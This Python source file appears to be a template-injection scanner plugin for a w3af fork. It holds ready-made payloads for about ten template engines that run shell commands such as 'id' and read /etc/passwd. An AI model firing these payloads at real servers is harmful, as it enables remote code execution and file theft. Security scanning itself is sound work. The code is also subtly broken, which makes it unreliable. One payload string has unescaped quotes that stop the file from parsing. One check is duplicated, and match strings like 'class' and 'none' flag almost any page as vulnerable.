"""
ssti.py - Server-Side Template Injection Detection

Copyright 2024 KameleonScan Team

This file is part of KameleonScan, a modernized w3af fork.

KameleonScan is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

KameleonScan is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with KameleonScan; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import re
import string
import random

import w3af.core.controllers.output_manager as om
import w3af.core.data.kb.knowledge_base as kb
import w3af.core.data.constants.severity as severity

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
from w3af.core.data.kb.vuln import Vuln
from w3af.core.data.fuzzer.fuzzer import create_mutants
from w3af.core.data.fuzzer.utils import rand_alnum
from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.options.option_list import OptionList


class ssti(AuditPlugin):
    """
    Detect Server-Side Template Injection (SSTI) vulnerabilities.
    
    This plugin tests for template injection in various template engines
    including Jinja2, Twig, ERB, FreeMarker, Velocity, and others.
    
    :author: KameleonScan Team
    :see: https://owasp.org/www-community/attacks/Server-Side_Include_(SSI)_Injection
    """
    
    # Template engine fingerprints and detection patterns
    TEMPLATE_PATTERNS = {
        # Jinja2 / Python
        'jinja2': {
            'detection': ['{{7*7}}', '${7*7}', '{% print(7*7) %}'],
            'success': ['49', '49'],
            'blind_payloads': ['{{config.items()}}', '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}']
        },
        # Twig / PHP
        'twig': {
            'detection': ['{{7*7}}', '{{7*7}}'],
            'success': ['49'],
            'blind_payloads': ['{{_self.env.cache}}', '{{_self.env.include("file:///etc/passwd")}}']
        },
        # ERB / Ruby
        'erb': {
            'detection': ['<%= 7*7 %>'],
            'success': ['49'],
            'blind_payloads': ['<%= system("id") %>', '<%= `id` %>']
        },
        # FreeMarker / Java
        'freemarker': {
            'detection': ['${7*7}', '#{7*7}'],
            'success': ['49'],
            'blind_payloads': ['<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }']
        },
        # Velocity / Java
        'velocity': {
            'detection': ['${7*7}', '#set($x=1)'],
            'success': ['49'],
            'blind_payloads': ["#set($runtime=$context.get('class').forName('java.lang.Runtime').getRuntime()) $runtime.exec('id')"]
        },
        # Mako / Python
        'mako': {
            'detection': ['${7*7}'],
            'success': ['49'],
            'blind_payloads': ['${self.module.cache.__import__("os").popen("id").read()}']
        },
        # Django / Python
        'django': {
            'detection': ['{{7*7}}'],
            'success': ['49'],
            'blind_payloads': ['{{settings.SECRET_KEY}}', '{% load module %}{% module os.system("id") %}']
        },
        # Handlebars / JavaScript
        'handlebars': {
            'detection': ['{{7*7}}'],
            'success': ['49'],
            'blind_payloads': ['{{#with (lookup (func "constructor") "call")}}{{#with (func "eval")}}{{this "global.process.env"}}{{/with}}{{/with}}']
        },
        # Jade / Pug
        'jade': {
            'detection': ['#{7*7}'],
            'success': ['49'],
            'blind_payloads': ['#(global.process.mainModule.require("child_process").execSync("id"))']
        },
        # Smarty / PHP
        'smarty': {
            'detection': ['{7*7}'],
            'success': ['49'],
            'blind_payloads': ['{system("id")}', '{php}system("id");{/php}']
        }
    }
    
    # Generic SSTI detection payloads (work across multiple engines)
    GENERIC_PAYLOADS = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '{7*7}',
        '{%% set x = "x" %%}{{x}}',
        '{{config}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
    ]
    
    # File read payloads
    FILE_READ_PAYLOADS = {
        'jinja2': ['{{"".__class__.__mro__[2].__subclasses__()}}', '{{url_for.__globals__["__builtins__"].open("/etc/passwd").read()}}'],
        'twig': ['{{_self.env.getTemplate("/etc/passwd").render()}}', '{{include("/etc/passwd")}}'],
        'erb': ['<%= File.read("/etc/passwd") %>', '<% require 'File' %>'],
        'freemarker': ['<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }'],
    }

    def __init__(self):
        AuditPlugin.__init__(self)
        self._random = rand_alnum(8)
        self._vulnerable_templates = set()
        
    def get_options(self):
        """
        :return: A list of option objects for this plugin.
        """
        opt = OptionList()
        
        o = opt_factory('detect_blind', True,
                       'Enable blind SSTI detection (slower but more thorough)',
                       'BOOL', 'DETECT_BLIND')
        opt.add(o)
        
        o = opt_factory('detect_generic', True,
                       'Enable generic SSTI detection',
                       'BOOL', 'DETECT_GENERIC')
        opt.add(o)
        
        o = opt_factory('detect_engine_specific', True,
                       'Enable engine-specific detection',
                       'BOOL', 'DETECT_ENGINE_SPECIFIC')
        opt.add(o)
        
        o = opt_factory('test_file_read', True,
                       'Test for file read capabilities when SSTI is found',
                       'BOOL', 'TEST_FILE_READ')
        opt.add(o)
        
        return opt

    def set_options(self, options):
        """
        Set the options given by the user.
        
        :param options: A dictionary with the options for the plugin.
        """
        self._detect_blind = options['detect_blind'].get_value()
        self._detect_generic = options['detect_generic'].get_value()
        self._detect_engine_specific = options['detect_engine_specific'].get_value()
        self._test_file_read = options['test_file_read'].get_value()

    def audit(self, freq, orig_response, debugging_id):
        """
        Tests an URL for SSTI vulnerabilities.
        
        :param freq: A FuzzableRequest
        :param orig_response: The HTTP response associated with the fuzzable request
        :param debugging_id: A unique identifier for this call to audit()
        """
        # Create mutants with SSTI test payloads
        mutants = create_mutants(freq, self.GENERIC_PAYLOADS[:3])
        
        for mutant in mutants:
            self._check_ssti(mutant, debugging_id)
    
    def _check_ssti(self, mutant, debugging_id):
        """
        Check for SSTI vulnerability in the parameter.
        
        :param mutant: The fuzzed request
        :param debugging_id: Unique identifier for debugging
        """
        try:
            response = self._uri_opener.send_mutant(mutant, grep=False, cache=False)
            
            if response is None:
                return
                
            body = response.get_body()
            headers = str(response.get_headers())
            
            # Check for generic detection ({{7*7}} -> 49)
            for payload in self.GENERIC_PAYLOADS[:5]:
                if payload.replace('7*7', '49') in body or payload.replace('7*7', '49') in headers:
                    self._report_vuln(mutant, response, payload, 'generic', 49)
                    return
                    
                if payload.replace('7*7', '49') in body or payload.replace('7*7', '49') in headers:
                    self._report_vuln(mutant, response, payload, 'generic', 49)
                    return
            
            # Check for specific template engine detection
            if self._detect_engine_specific:
                self._check_engine_specific(mutant, debugging_id)
                
        except Exception as e:
            om.out.debug(f"Error checking SSTI for {mutant.get_url()}: {e}")
    
    def _check_engine_specific(self, mutant, debugging_id):
        """
        Test for specific template engine vulnerabilities.
        
        :param mutant: The fuzzed request
        :param debugging_id: Unique identifier
        """
        # Use a subset of payloads for engine-specific testing
        test_payloads = [
            ('jinja2', ['{{7*7}}', '{{"".__class__.__mro__}}']),
            ('twig', ['{{7*7}}', '{{_self}}']),
            ('erb', ['<%= 7*7 %>', '<%= Dir.entries("/") %>']),
            ('freemarker', ['${7*7}', '${"类"?eval}']),
            ('velocity', ['${7*7}', '${class.inspect("")}']),
            ('smarty', ['{7*7}', '{php}echo "test";{/php}']),
            ('handlebars', ['{{7*7}}']),
            ('django', ['{{7*7}}', '{{request}}']),
        ]
        
        for engine, payloads in test_payloads:
            for payload in payloads:
                # Create mutant with this payload
                test_mutant = mutant.copy()
                test_mutant.set_modifyed_data(payload)
                
                try:
                    response = self._uri_opener.send_mutant(test_mutant, grep=False, cache=False)
                    if response is None:
                        continue
                        
                    body = response.get_body()
                    
                    # Check for successful execution
                    for success_pattern in ['49', 'template', 'builtins', 'class', 'none']:
                        if success_pattern.lower() in body.lower():
                            self._report_vuln(test_mutant, response, payload, engine, success_pattern)
                            return
                            
                except Exception:
                    pass
    
    def _check_file_read(self, mutant, template_engine):
        """
        Test if the SSTI can be exploited to read files.
        
        :param mutant: The fuzzed request
        :param template_engine: The detected template engine
        """
        if template_engine not in self.FILE_READ_PAYLOADS:
            return None
            
        payloads = self.FILE_READ_PAYLOADS.get(template_engine, [])
        
        for payload in payloads:
            test_mutant = mutant.copy()
            test_mutant.set_modifyed_data(payload)
            
            try:
                response = self._uri_opener.send_mutant(test_mutant, grep=False, cache=False)
                if response is None:
                    continue
                    
                body = response.get_body()
                
                # Check for file content indicators
                if any(indicator in body for indicator in ['root:', 'daemon:', '[boot loader]', '#!/bin']):
                    return body[:500]  # Return first 500 chars
                    
            except Exception:
                pass
        
        return None
    
    def _report_vuln(self, mutant, response, payload, template_engine, detected_value):
        """
        Report a discovered SSTI vulnerability.
        
        :param mutant: The fuzzed request
        :param response: The HTTP response
        :param payload: The payload that triggered the vulnerability
        :param template_engine: The detected template engine
        :param detected_value: The value that confirms exploitation
        """
        vuln = Vuln(mutant.get_url())
        
        vuln.set_plugin(self.get_name())
        vuln.set_name('Server-Side Template Injection')
        vuln.set_severity(severity.HIGH)
        
        desc = f"""SSTI Vulnerability Detected

Template Engine: {template_engine}
Payload: {payload}
Detected Value: {detected_value}

This vulnerability allows attackers to inject template code and potentially
execute arbitrary code on the server. The detected template engine responds
to mathematical operations, confirming code execution capability.

Remediation:
1. Use Sandboxed Template Engines
2. Implement strict input validation
3. Disable dangerous template features
4. Use Allowlist-based template selection
5. Consider using a separate sandboxed process for template rendering
"""
        vuln.set_desc(desc)
        
        # Test for file read capability
        if self._test_file_read:
            file_content = self._check_file_read(mutant, template_engine)
            if file_content:
                vuln.set_desc(vuln.get_desc() + f"\n\nFile Read Confirmed:\n{file_content[:200]}...")
        
        vuln.add_to_highlight(payload)
        
        # Save to knowledge base
        kb.kb.append(self, 'ssti', vuln)
        
        # Log the finding
        om.out.high_vuln(vuln.get_desc())
        
    def get_plugin_deps(self):
        """
        :return: A list with the names of the plugins that should
                 run before this one.
        """
        return ['grep.error_404']
    
    def get_long_desc(self):
        """
        :return: A DETAILED description of what the plugin does and how
                 it is used.
        """
        return """
        This plugin detects Server-Side Template Injection (SSTI) vulnerabilities
        in web applications. SSTI occurs when user input is directly embedded
        in template code without proper sanitization.
        
        The plugin tests for:
        - Generic template injection patterns
        - Engine-specific injection techniques
        - Code execution capabilities
        - File read capabilities (when enabled)
        
        Supported template engines:
        - Jinja2 (Python)
        - Twig (PHP)
        - ERB (Ruby)
        - FreeMarker (Java)
        - Velocity (Java)
        - Mako (Python)
        - Django (Python)
        - Handlebars (JavaScript)
        - Jade/Pug (JavaScript)
        - Smarty (PHP)
        """